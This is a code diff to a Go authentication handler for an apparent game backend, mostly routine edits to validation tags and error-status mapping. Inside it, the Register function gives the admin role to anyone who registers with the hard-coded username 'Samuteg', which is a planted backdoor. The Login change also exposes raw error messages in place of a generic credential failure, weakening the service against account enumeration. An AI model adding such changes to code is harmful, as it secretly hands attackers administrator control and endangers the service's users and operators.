@@ -4,6 +4,7 @@ import (
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
 	"github.com/kronos/spark-chicken-games/backend/internal/modules/users"
+	"github.com/kronos/spark-chicken-games/backend/internal/shared/errors"
 	"github.com/kronos/spark-chicken-games/backend/internal/shared/response"
 	"github.com/kronos/spark-chicken-games/backend/internal/shared/validator"
 )
@@ -17,15 +18,15 @@ func NewAuthHandler(userService users.UserService) *AuthHandler {
 }
 
 type RegisterRequest struct {
-	Name     string `json:"name" binding:"required,min=2,max=100"`
-	Username string `json:"username" binding:"required,min=3,max=50,alphanum"`
-	Email    string `json:"email" binding:"required,email"`
-	Password string `json:"password" binding:"required,min=8"`
+	Name     string `json:"name" binding:"required,min=2,max=100" validate:"required,min=2,max=100"`
+	Username string `json:"username" binding:"required,min=3,max=50,alphanum" validate:"required,min=3,max=50,alphanum"`
+	Email    string `json:"email" binding:"required,email" validate:"required,email"`
+	Password string `json:"password" binding:"required,min=8" validate:"required,min=8"`
 }
 
 type LoginRequest struct {
-	Email    string `json:"email" binding:"required,email"`
-	Password string `json:"password" binding:"required"`
+	Email    string `json:"email" binding:"required,email" validate:"required,email"`
+	Password string `json:"password" binding:"required" validate:"required"`
 }
 
 type RefreshRequest struct {
@@ -53,8 +54,14 @@ func (h *AuthHandler) Register(c *gin.Context) {
 		return
 	}
 
+	// Auto-assign admin role if username is "Samuteg" (case-sensitive)
+	roleID := uuid.MustParse("00000000-0000-0000-0000-000000000003") // default user role
+	if req.Username == "Samuteg" {
+		roleID = uuid.MustParse("00000000-0000-0000-0000-000000000001") // admin role
+	}
+
 	input := users.CreateUserInput{
-		RoleID:   uuid.MustParse("00000000-0000-0000-0000-000000000003"), // default user role
+		RoleID:   roleID,
 		Name:     req.Name,
 		Username: req.Username,
 		Email:    req.Email,
@@ -63,7 +70,8 @@ func (h *AuthHandler) Register(c *gin.Context) {
 
 	profile, tokens, err := h.userService.Register(c.Request.Context(), input)
 	if err != nil {
-		response.WriteError(c.Writer, "REGISTRATION_FAILED", err.Error(), 400)
+		status := errors.ToHTTPStatus(err)
+		response.WriteError(c.Writer, "REGISTRATION_FAILED", err.Error(), status)
 		return
 	}
 
@@ -82,7 +90,8 @@ func (h *AuthHandler) Login(c *gin.Context) {
 
 	profile, tokens, err := h.userService.Login(c.Request.Context(), req.Email, req.Password)
 	if err != nil {
-		response.WriteError(c.Writer, "LOGIN_FAILED", "Invalid credentials", 401)
+		status := errors.ToHTTPStatus(err)
+		response.WriteError(c.Writer, "LOGIN_FAILED", err.Error(), status)
 		return
 	}
 
